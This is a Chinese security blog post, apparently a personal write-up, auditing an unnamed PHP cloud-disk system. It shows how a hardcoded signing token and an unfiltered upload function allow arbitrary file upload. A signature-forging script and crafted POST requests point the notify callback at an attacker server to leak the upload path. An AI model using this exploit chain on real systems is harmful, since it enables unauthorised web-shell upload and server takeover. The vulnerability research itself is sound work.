@@ -1,0 +1,356 @@
+<html>
+  <head>
+    <meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>代码审计-某云盘系统GetShell | 秋嘞个秋</title>
+<link rel="shortcut icon" href="https://sl3epf.github.io/favicon.ico?v=1710164223744">
+<link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
+<link rel="stylesheet" href="https://sl3epf.github.io/styles/main.css">
+<link rel="alternate" type="application/atom+xml" title="代码审计-某云盘系统GetShell | 秋嘞个秋 - Atom Feed" href="https://sl3epf.github.io/atom.xml">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">
+
+
+
+    <meta name="description" content="
+前言
+看到这个系统的文件上传挺有意思的，弄了套源码过来看看。
+分析
+漏洞路由在 /server/index.php
+对应文件的漏洞点函数
+
+可以看到通过 md 参数可以进行 upload 和 download 的操作
+但是首先还是要过前面..." />
+    <meta name="keywords" content="代码审计,PHP" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+    <script src="//cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.5.1/build/highlight.min.js"></script>
+  </head>
+  <body>
+    <div class="main">
+      <div class="main-content">
+        <div class="site-header">
+  <a href="https://sl3epf.github.io">
+  <img class="avatar" src="https://sl3epf.github.io/images/avatar.png?v=1710164223744" alt="">
+  </a>
+  <h1 class="site-title">
+    秋嘞个秋
+  </h1>
+  <p class="site-description">
+    弃我去者，昨日之日不可留
+<br/>
+乱我心者，今日之日多烦忧
+  </p>
+  <div class="menu-container">
+    
+      
+        <a href="/" class="menu">
+          首页
+        </a>
+      
+    
+      
+        <a href="/archives" class="menu">
+          归档
+        </a>
+      
+    
+      
+        <a href="/tags" class="menu">
+          标签
+        </a>
+      
+    
+      
+        <a href="/post/about" class="menu">
+          关于
+        </a>
+      
+    
+  </div>
+  <div class="social-container">
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+  </div>
+</div>
+
+        <div class="post-detail">
+          <article class="post">
+            <h2 class="post-title">
+              代码审计-某云盘系统GetShell
+            </h2>
+            <div class="post-info">
+              <span>
+                2024-01-04
+              </span>
+              <span>
+                5 min read
+              </span>
+              
+                <a href="https://sl3epf.github.io/tag/6uld_ICkB/" class="post-tag">
+                  # 代码审计
+                </a>
+              
+                <a href="https://sl3epf.github.io/tag/_sHMl6GQLc/" class="post-tag">
+                  # PHP
+                </a>
+              
+            </div>
+            
+            <div class="post-content-wrapper">
+              <div class="post-content" v-pre>
+                <!-- more -->
+<h1 id="前言">前言</h1>
+<p>看到这个系统的文件上传挺有意思的，弄了套源码过来看看。</p>
+<h1 id="分析">分析</h1>
+<p>漏洞路由在 /server/index.php<br>
+对应文件的漏洞点函数<br>
+<img src="https://sl3epf.github.io/post-images/1704344315196.png" alt="" loading="lazy"><br>
+可以看到通过 md 参数可以进行 upload 和 download 的操作<br>
+但是首先还是要过前面三个 if，第一个直接传 md=upload 就好，第二个需要接收一个 sign 的签名参数。<br>
+重点看第三个，需要验证签名，我们跟入</p>
+<pre><code class="language-php">protected function sign_verify($params,$sign): bool
+{
+        return $this-&gt;sign_params($params) == $sign;
+}
+
+ protected function sign_params($params): string
+    {
+        // 过滤参数
+        $params = array_filter($params,function($key) use ($params){
+            if(empty($params[$key]) || $key == 'sign'){
+                return false;
+            }
+            return true;
+        },ARRAY_FILTER_USE_KEY);
+
+        // ascii排序
+        ksort($params);
+        reset($params);
+
+        // 签名
+        return md5(urldecode(http_build_query($params)) . $this-&gt;config['token']);
+    }
+</code></pre>
+<p>总体来说，这个函数的目的是对一组参数进行签名，首先通过过滤和排序确保参数的一致性，然后利用<code>http_build_query</code>将参数连接成字符串，加上token，最后用md5生成 sign，判断我们输入的 sign 是否和生成的相等。<br>
+而这个 token 我们也可以直接找到，是硬编码<br>
+<img src="https://sl3epf.github.io/post-images/1704345026812.png" alt="" loading="lazy"><br>
+于是就可以构造出文件上传<br>
+<img src="https://sl3epf.github.io/post-images/1704345196242.jpg" alt="" loading="lazy"><br>
+我们往下看发现这里需要传入一个 uid 参数，然后进入 <code>upload_file</code> 函数<br>
+<img src="https://sl3epf.github.io/post-images/1704345294348.png" alt="" loading="lazy"><br>
+跟进去看也可以发现是一个很常规的文件上传函数，并没有做任何的过滤。<br>
+构造出上传请求，其中传入的 uid 会作为我们上传文件的目录</p>
+<pre><code class="language-html">POST /server/index.php?md=upload&amp;sign=e8766abd8742eb67a2c07b089ecf636a&amp;uid=1 HTTP/2.0
+Host: xxxx
+Content-Type: multipart/form-data; boundary=------------------------ZKUEuJmuCMrQNDmEHNoSaDEXDrygeXDHXShtOfZf
+cookie: xxxx
+Content-Length: 457
+
+--------------------------ZKUEuJmuCMrQNDmEHNoSaDEXDrygeXDHXShtOfZf
+Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;1.php&quot;
+
+test
+
+--------------------------ZKUEuJmuCMrQNDmEHNoSaDEXDrygeXDHXShtOfZf
+</code></pre>
+<p>发包后就会走到</p>
+<pre><code class="language-php">// 回调通知
+                $res = $this-&gt;upload_notify($_GET['notify'],$info);
+                if($res != 'UPLOAD_SUCCESS'){
+                    $this-&gt;returnJson(0,'同步错误：'.$res);
+                }
+</code></pre>
+<figure data-type="image" tabindex="1"><img src="https://sl3epf.github.io/post-images/1704345614802.png" alt="" loading="lazy"></figure>
+<p>这里虽然报错，但是其实已经传上去了...因为<code>upload_file</code>函数已经走完了<br>
+但是他并没有返回给我们路径，并且在函数里可以看到他的文件名是随机的 16 位字符</p>
+<pre><code class="language-php">// 文件后缀
+        $file_ext = strtolower(pathinfo($file['name'],PATHINFO_EXTENSION));
+
+        // 获取保存目录
+        $save_dir = $this-&gt;getUserUploadPath($uid);
+
+        // 获取保存文件夹
+        $file_name = 'file_'.$this-&gt;getRandomName(16);
+
+        // 最终保存路径
+        $save_file = $this-&gt;runtime_path . $save_dir . $file_name .'.'. $file_ext;
+
+        // 保存文件
+        move_uploaded_file($file[&quot;tmp_name&quot;], $save_file);
+
+
+        if(!is_file($save_file)){
+            $this-&gt;returnJson(0,'文件上传失败：Error Move Files');
+        }
+</code></pre>
+<p>但是有趣的是他下面还调用了一个<code>upload_notify</code>函数，跟进</p>
+<pre><code class="language-php">protected function upload_notify($url,$param)
+    {
+        // 生成签名
+        $sign = $this-&gt;sign_params($param);
+        $param['sign'] = $sign;
+
+        // 请求地址
+        $request_url = $url.'?'.urldecode(http_build_query($param));
+
+        $ch = curl_init();
+        curl_setopt($ch, CURLOPT_URL, $request_url);
+        curl_setopt($ch, CURLOPT_HEADER, 0);
+        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE);
+        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, FALSE);
+
+        $result = curl_exec($ch);
+        curl_close($ch);
+        return $result;
+    }
+</code></pre>
+<p>这个函数意思就是调用了 curl去对传入的 url 发起一次请求，并将响应的结果返回<br>
+但是似乎我们还是获取不到路径，这里我们再关注第二个参数<code>$param</code>，它是由前面的<code>$info</code>传入<br>
+<img src="https://sl3epf.github.io/post-images/1704369997209.png" alt="" loading="lazy"><br>
+而 info 又是 upload_file 的返回值</p>
+<pre><code class="language-php">// 文件信息
+        return [
+            'name' =&gt; $file['name'],
+            'ext' =&gt; $file_ext,
+            'path' =&gt; $save_dir . $file_name .'.'. $file_ext,
+            'size' =&gt; $size,
+            'mime' =&gt; $mime_type
+        ];
+</code></pre>
+<p>可以看到他的文件名路径等信息都在里面，所以我们只需要构造一个 url 让程序去请求我们的地址，我们再看请求的记录就能看到路径信息</p>
+<h1 id="利用">利用</h1>
+<p>先在 vps 上起个http服务<br>
+然后利用签名脚本生成签名</p>
+<pre><code class="language-php">&lt;?php
+function sign_params($params): string
+{
+    // 过滤参数
+    $params = array_filter($params,function($key) use ($params){
+        if(empty($params[$key]) || $key == 'sign'){
+            return false;
+        }
+        return true;
+    },ARRAY_FILTER_USE_KEY);
+
+    // ascii排序
+    ksort($params);
+    reset($params);
+    var_dump($params);
+    // 签名
+    //http_build_query($params) 将参数数组拼接成 URL 查询字符串。
+    var_dump($params);
+    var_dump(http_build_query($params));
+    return md5(urldecode(http_build_query($params)) . &quot;asdasfasfasfasfasfa&quot;);
+}
+
+$_GET['md'] = &quot;upload&quot;;
+$_GET['uid'] = &quot;3&quot;;
+$_GET['notify'] = 'http://ip:port/';
+echo sign_params($_GET);
+</code></pre>
+<p>然后构造请求</p>
+<pre><code class="language-html">POST /server/index.php?md=upload&amp;sign=签名&amp;uid=1&amp;notify=http://ip:port HTTP/2.0
+Host:  xxxx
+Content-Type: multipart/form-data; boundary=------------------------ZKUEuJmuCMrQNDmEHNoSaDEXDrygeXDHXShtOfZf
+Content-Length: 457
+
+--------------------------ZKUEuJmuCMrQNDmEHNoSaDEXDrygeXDHXShtOfZf
+Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;1.php&quot;
+
+test
+
+--------------------------ZKUEuJmuCMrQNDmEHNoSaDEXDrygeXDHXShtOfZf\
+</code></pre>
+<p>回到服务器上就能看到请求<br>
+<img src="https://sl3epf.github.io/post-images/1704370760018.png" alt="" loading="lazy"><br>
+成功访问<br>
+<img src="https://sl3epf.github.io/post-images/1704370803067.png" alt="" loading="lazy"></p>
+
+              </div>
+              <div class="toc-container">
+                <ul class="markdownIt-TOC">
+<li><a href="#%E5%89%8D%E8%A8%80">前言</a></li>
+<li><a href="#%E5%88%86%E6%9E%90">分析</a></li>
+<li><a href="#%E5%88%A9%E7%94%A8">利用</a></li>
+</ul>
+
+              </div>
+            </div>
+          </article>
+        </div>
+
+        
+          <div class="next-post">
+            <div class="next">下一篇</div>
+            <a href="https://sl3epf.github.io/post/q0RqVX7zC/">
+              <h3 class="post-title">
+                2023年终总结
+              </h3>
+            </a>
+          </div>
+        
+
+        
+
+        <div class="site-footer">
+  Friends: <a href="https://zjackky.github.io/" target="_blank">zjackky</a>&nbsp;<a href="https://jaspersec.top/" target="_blank">jasper</a>&nbsp;<a href="https://zikh26.github.io/" target="_blank">zikh26</a>&nbsp;<a href="http://payioad.com/" target="_blank">payioad</a>&nbsp;
+<a href="http://blog.ldsecurity.cn/" target="_blank">凌度</a>&nbsp;<a href="http://www.aiwin.fun/" target="_blank">aiwin</a>&nbsp;
+  <a class="rss" href="https://sl3epf.github.io/atom.xml" target="_blank">
+    <i class="ri-rss-line"></i> RSS
+  </a>
+</div>
+
+      </div>
+    </div>
+
+    <script>
+      hljs.initHighlightingOnLoad()
+
+      let mainNavLinks = document.querySelectorAll(".markdownIt-TOC a");
+
+      // This should probably be throttled.
+      // Especially because it triggers during smooth scrolling.
+      // https://lodash.com/docs/4.17.10#throttle
+      // You could do like...
+      // window.addEventListener("scroll", () => {
+      //    _.throttle(doThatStuff, 100);
+      // });
+      // Only not doing it here to keep this Pen dependency-free.
+
+      window.addEventListener("scroll", event => {
+        let fromTop = window.scrollY;
+
+        mainNavLinks.forEach((link, index) => {
+          let section = document.getElementById(decodeURI(link.hash).substring(1));
+          let nextSection = null
+          if (mainNavLinks[index + 1]) {
+            nextSection = document.getElementById(decodeURI(mainNavLinks[index + 1].hash).substring(1));
+          }
+          if (section.offsetTop <= fromTop) {
+            if (nextSection) {
+              if (nextSection.offsetTop > fromTop) {
+                link.classList.add("current");
+              } else {
+                link.classList.remove("current");    
+              }
+            } else {
+              link.classList.add("current");
+            }
+          } else {
+            link.classList.remove("current");
+          }
+        });
+      });
+
+    </script>
+  </body>
+</html>
